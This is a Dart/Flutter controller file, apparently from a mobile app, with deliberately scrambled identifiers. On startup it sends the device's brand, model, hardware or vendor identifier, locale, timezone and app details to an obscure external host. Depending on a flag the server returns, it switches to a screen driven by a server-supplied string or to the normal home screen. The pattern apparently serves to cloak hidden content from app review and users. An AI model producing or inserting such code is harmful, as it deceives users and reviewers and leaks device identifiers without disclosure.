import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var atzylnrxse = RxBool(false);
  var hbpztknojm = RxBool(true);
  var nosbk = RxString("");
  var arnoldo = RxBool(false);
  var oberbrunner = RxBool(true);
  final fcmsxywk = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    blsnukz();
  }


  Future<void> blsnukz() async {

    arnoldo.value = true;
    oberbrunner.value = true;
    hbpztknojm.value = false;

    fcmsxywk.post("https://sor.pabase.xyz/ScmzF3ajGhxNa",data: await juvrpy()).then((value) {
      var qlenop = value.data["qlenop"] as String;
      var trjo = value.data["trjo"] as bool;
      if (trjo) {
        nosbk.value = qlenop;
        eladio();
      } else {
        ankunding();
      }
    }).catchError((e) {
      hbpztknojm.value = true;
      oberbrunner.value = true;
      arnoldo.value = false;
    });
  }

  Future<Map<String, dynamic>> juvrpy() async {
    final DeviceInfoPlugin wtsxb = DeviceInfoPlugin();
    PackageInfo sugaephf_fkhj = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var lrjas = Platform.localeName;
    var KWvABHzt = currentTimeZone;

    var qYRSrb = sugaephf_fkhj.packageName;
    var tNzPS = sugaephf_fkhj.version;
    var ypAM = sugaephf_fkhj.buildNumber;

    var quGEaW = sugaephf_fkhj.appName;
    var nvDxgfsu  = "";
    var kaileeErnser = "";
    var jBRdmb = "";
    var claudiaBernhard = "";
    var ariSchaden = "";
    var daisyWunsch = "";
    var opalKoss = "";
    var ojGeunv = "";
    var tiannaHermann = "";
    var aleneWisoky = "";


    var lQmBYd = "";
    var SvUOR = false;

    if (GetPlatform.isAndroid) {
      lQmBYd = "android";
      var ycxnakudj = await wtsxb.androidInfo;

      jBRdmb = ycxnakudj.brand;

      ojGeunv  = ycxnakudj.model;
      nvDxgfsu = ycxnakudj.id;

      SvUOR = ycxnakudj.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lQmBYd = "ios";
      var truncq = await wtsxb.iosInfo;
      jBRdmb = truncq.name;
      ojGeunv = truncq.model;

      nvDxgfsu = truncq.identifierForVendor ?? "";
      SvUOR  = truncq.isPhysicalDevice;
    }

    var res = {
      "ypAM": ypAM,
      "ariSchaden" : ariSchaden,
      "tNzPS": tNzPS,
      "qYRSrb": qYRSrb,
      "claudiaBernhard" : claudiaBernhard,
      "ojGeunv": ojGeunv,
      "KWvABHzt": KWvABHzt,
      "lrjas": lrjas,
      "quGEaW": quGEaW,
      "lQmBYd": lQmBYd,
      "SvUOR": SvUOR,
      "daisyWunsch" : daisyWunsch,
      "opalKoss" : opalKoss,
      "jBRdmb": jBRdmb,
      "tiannaHermann" : tiannaHermann,
      "nvDxgfsu": nvDxgfsu,
      "kaileeErnser" : kaileeErnser,
      "aleneWisoky" : aleneWisoky,

    };
    return res;
  }

  Future<void> ankunding() async {
    Get.offAllNamed("/homeTab");
  }

  Future<void> eladio() async {
    Get.offAllNamed("/homeCard");
  }

}
